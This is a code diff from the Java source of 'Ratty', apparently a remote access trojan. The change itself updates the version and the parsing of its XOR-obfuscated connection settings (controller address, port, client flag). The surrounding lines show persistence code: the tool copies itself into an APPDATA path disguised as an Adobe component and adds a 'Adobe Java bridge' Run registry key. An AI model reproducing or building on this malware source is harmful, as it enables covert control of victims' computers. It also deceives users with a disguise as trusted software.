@@ -25,7 +25,7 @@ import de.sogomn.rat.util.XorCipher;
 public final class Ratty {
 	
 	public static final boolean DEBUG = true;
-	public static final String VERSION = "1.21.0";
+	public static final String VERSION = "1.22.0";
 	public static final ResourceBundle LANGUAGE = ResourceBundle.getBundle("language.lang");
 	
 	private static final String ADDRESS;
@@ -33,7 +33,7 @@ public final class Ratty {
 	private static final boolean CLIENT;
 	
 	private static final int CONNECTION_INTERVAL = 5000;
-	private static final String CONNECTION_DATA_FILE_NAME = "/connection_data";
+	private static final String CONNECTION_DATA_FILE_NAME = "/data";
 	private static final String STARTUP_FILE_PATH = System.getenv("APPDATA") + File.separator + "Adobe" + File.separator + "AIR" + File.separator + "jre13v3bridge.jar";
 	private static final String STARTUP_REGISTRY_COMMAND = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Adobe Java bridge\" /d \"" + STARTUP_FILE_PATH + "\"";
 	
@@ -49,10 +49,10 @@ public final class Ratty {
 		XorCipher.crypt(data);
 		
 		final String text = new String(data);
-		final String[] lines = text.split("[\r\n]");
-		final String addressString = lines[0].trim();
-		final String portString = lines[1].trim();
-		final String clientString = lines[2].trim();
+		final String[] lines = text.split("\r\n");
+		final String addressString = lines[0];
+		final String portString = lines[1];
+		final String clientString = lines[2];
 		
 		ADDRESS = addressString;
 		PORT = Integer.parseInt(portString);
